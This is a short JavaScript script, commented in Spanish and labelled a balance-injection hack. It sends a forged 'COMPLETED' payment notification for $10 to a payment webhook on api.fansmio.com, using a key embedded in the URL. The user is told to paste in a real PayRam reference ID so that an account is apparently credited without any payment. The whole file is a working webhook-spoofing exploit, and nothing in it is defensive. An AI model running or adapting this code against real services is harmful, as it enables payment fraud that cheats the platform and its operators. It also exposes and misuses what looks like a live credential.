// sonar.js - Hackeo de inyección de saldo
async function probarRadar() {
  console.log("🚀 Disparando misil de inyección...");
  
  try {
    const url = 'https://api.fansmio.com/api/webhooks/payram?key=2a0b3a5c98e7b3bb6ec52df6189c3e1d';
    
    const respuesta = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        // 🔥 PEGA AQUÍ TU ID REAL DE PAYRAM:
        referenceId: "PAYRAM-XXXXXX", 
        status: "COMPLETED",
        filled_amount_in_usd: "10.00"
      })
    });

    const texto = await respuesta.text();
    console.log(`\n🎯 IMPACTO - Código de respuesta: ${respuesta.status}`);
    console.log(`📝 Mensaje del servidor:`, texto);

  } catch (error) {
    console.error("❌ Error de red:", error);
  }
}

probarRadar();